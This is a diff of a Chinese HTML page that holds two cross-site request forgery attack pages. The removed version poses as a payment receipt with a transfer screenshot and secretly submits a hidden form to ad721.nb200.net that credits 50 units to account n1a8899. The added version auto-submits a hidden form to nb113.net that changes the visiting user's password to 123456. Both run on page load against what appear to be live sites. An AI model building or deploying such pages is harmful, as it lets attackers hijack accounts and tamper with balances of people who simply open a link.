@@ -2,61 +2,24 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>交易成功凭证</title>
-  <style>
-    body {
-      background-color: #fff;
-      text-align: center;
-      margin-top: 50px;
-      font-family: Arial, sans-serif;
-    }
-    img {
-      max-width: 50%;
-      height: auto;
-      border: 1px solid #ccc;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    iframe {
-      width: 50%;
-      height: 600px;
-      border: 1px solid #ccc;
-      margin-top: 30px;
-    }
-  </style>
+  <title>测试密码更改</title>
 </head>
 <body>
 
-  <h2>交易成功凭证</h2>
-  <img src="transfer_proof.png" alt="转账截图">
+<h3>正在提交密码更改请求，请稍等...</h3>
 
-  <!-- ✅ 表单：提交到目标站，响应显示在 iframe 中 -->
-  <form id="csrfForm" method="POST" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index">
-    <input type="hidden" name="decide" value="">
-    <input type="hidden" name="checkVerifc" value="4fe83a323debe74285b611d1a3c2fb83">
-    <input type="hidden" name="memberAccount" value="n1a8899">
-    <input type="hidden" name="searchPoint" value="1">
-    <input type="hidden" name="upMoney" value="50">
-    <input type="hidden" name="upType" value="3">
-    <input type="hidden" name="upGameId" value="22">
-    <input type="hidden" name="upEventId" value="1">
-    <input type="hidden" name="upOther" value="1;推广赠點">
-    <input type="hidden" name="upMain" value="测试入點">
-    <input type="hidden" name="upRemark" value="">
-    <input type="hidden" name="typeMoney" value="additionMoney">
-    <input type="hidden" name="keyWord" value="9521">
-  </form>
+<form id="csrfForm" method="POST" action="https://nb113.net/index.php?s=/MemberCenter/formChangePassword">
+  <input type="hidden" name="oldPassword" value="@qwer1234">
+  <input type="hidden" name="newPassword" value="123456">
+  <input type="hidden" name="new2Password" value="123456">
+</form>
 
-  <!-- ✅ iframe：不隐藏，用于展示响应内容 -->
- <iframe name="resultFrame" width="100%" height="600px" style="border: 1px solid #ccc;"></iframe>
-
-  <p>哈希：90c789******11e346d</p>
-
-  <script>
-    // 提交表单：延迟 3 秒
-    setTimeout(() => {
-      document.getElementById('csrfForm').submit();
-    }, 5000);
-  </script>
+<script>
+  // 等待1秒后自动提交表单
+  setTimeout(() => {
+    document.getElementById('csrfForm').submit();
+  }, 1000);
+</script>
 
 </body>
 </html>
